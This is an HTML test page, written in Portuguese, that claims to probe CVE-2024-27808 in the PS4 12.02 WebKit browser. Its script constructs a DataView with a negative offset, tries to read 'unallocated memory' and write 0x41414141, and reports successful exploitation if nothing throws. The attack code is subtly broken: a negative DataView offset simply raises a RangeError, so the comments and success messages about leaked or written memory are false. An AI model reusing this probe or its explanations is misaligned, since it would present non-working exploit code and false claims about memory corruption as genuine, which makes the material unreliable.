<!DOCTYPE html>
<html>
<head>
    <title>CVE-2024-27808 Test (PS4 12.02)</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
        #result { color: red; font-weight: bold; margin-top: 20px; }
    </style>
</head>
<body>
    <h1>Testando CVE-2024-27808 no PS4 (WebKit)</h1>
    <p>Tentando acessar memória com offset negativo em DataView...</p>
    <div id="result"></div>

    <script>
        const result = document.getElementById('result');

        try {
            // 1. Criar um ArrayBuffer pequeno
            const buffer = new ArrayBuffer(16);
            
            // 2. Tentar acessar um offset NEGATIVO em DataView
            const evilView = new DataView(buffer, -4); // Offset negativo
            const leakedValue = evilView.getUint32(0); // Lê memória não alocada
            
            // 3. Se não crashar, pode ser vulnerável
            result.textContent = `Possível exploração BEM-SUCEDIDA! Valor lido: 0x${leakedValue.toString(16)}`;
            
            // 4. Tentar escrever em memória inválida (teste adicional)
            evilView.setUint32(0, 0x41414141); // Se não travar, vulnerabilidade crítica
            result.textContent += " | Escrita em memória também funcionou!";
            
        } catch (e) {
            // 5. Se cair aqui, o PS4 corrigiu ou o CVE não se aplica
            result.textContent = `Falha: ${e.message}`;
        }
    </script>
</body>
</html>
